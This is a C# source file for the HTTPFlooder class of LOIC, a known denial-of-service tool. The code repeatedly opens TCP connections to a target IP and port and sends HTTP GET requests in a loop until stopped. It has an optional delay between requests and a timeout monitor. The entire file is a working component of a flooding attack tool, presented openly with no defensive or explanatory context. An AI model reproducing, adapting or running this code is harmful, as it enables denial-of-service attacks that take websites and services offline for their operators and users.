using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace LOIC
{
  internal class HTTPFlooder : IFlooder
  {
    private Random random = new Random();
    private System.Windows.Forms.Timer tTimepoll = new System.Windows.Forms.Timer();
    private BackgroundWorker bw;
    private long lastAction;

    public int Delay { get; set; }

    public int Downloaded { get; set; }

    public int Requested { get; set; }

    public int Failed { get; set; }

    public bool IsFlooding { get; set; }

    public string IP { get; set; }

    public int Port { get; set; }

    public bool Resp { get; set; }

    public ReqState State { get; set; }

    public string Subsite { get; set; }

    public int Timeout { get; set; }

    public HTTPFlooder(string ip, int port, string subSite, bool resp, int delay, int timeout)
    {
      this.IP = ip;
      this.Port = port;
      this.Subsite = subSite;
      this.Resp = resp;
      this.Delay = delay;
      this.Timeout = timeout;
    }

    public void Start()
    {
      this.IsFlooding = true;
      this.lastAction = HTTPFlooder.Tick();
      this.tTimepoll = new System.Windows.Forms.Timer();
      this.tTimepoll.Tick += new EventHandler(this.tTimepoll_Tick);
      this.tTimepoll.Start();
      this.bw = new BackgroundWorker();
      this.bw.DoWork += new DoWorkEventHandler(this.bw_DoWork);
      this.bw.RunWorkerAsync();
      this.bw.WorkerSupportsCancellation = true;
    }

    public void Stop()
    {
      this.IsFlooding = false;
      this.bw.CancelAsync();
    }

    private static long Tick()
    {
      return DateTime.Now.Ticks / 10000L;
    }

    private void bw_DoWork(object sender, DoWorkEventArgs e)
    {
      try
      {
        byte[] bytes = Encoding.ASCII.GetBytes(string.Format("GET {0} HTTP/1.0{1}{1}{1}", (object) this.Subsite, (object) Environment.NewLine));
        IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Parse(this.IP), this.Port);
        while (this.IsFlooding)
        {
          this.State = ReqState.Ready;
          this.lastAction = HTTPFlooder.Tick();
          byte[] buffer = new byte[64];
          Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
          this.State = ReqState.Connecting;
          socket.Connect((EndPoint) ipEndPoint);
          socket.Blocking = this.Resp;
          this.State = ReqState.Requesting;
          socket.Send(bytes, SocketFlags.None);
          this.State = ReqState.Downloading;
          ++this.Requested;
          if (this.Resp)
            socket.Receive(buffer, 64, SocketFlags.None);
          this.State = ReqState.Completed;
          ++this.Downloaded;
          this.tTimepoll.Stop();
          if (this.Delay > 0)
            Thread.Sleep(this.Delay);
        }
      }
      catch
      {
      }
      finally
      {
        this.IsFlooding = false;
      }
    }

    private void tTimepoll_Tick(object sender, EventArgs e)
    {
      if (HTTPFlooder.Tick() <= this.lastAction + (long) this.Timeout)
        return;
      this.IsFlooding = false;
      ++this.Failed;
      this.State = ReqState.Failed;
    }
  }
}
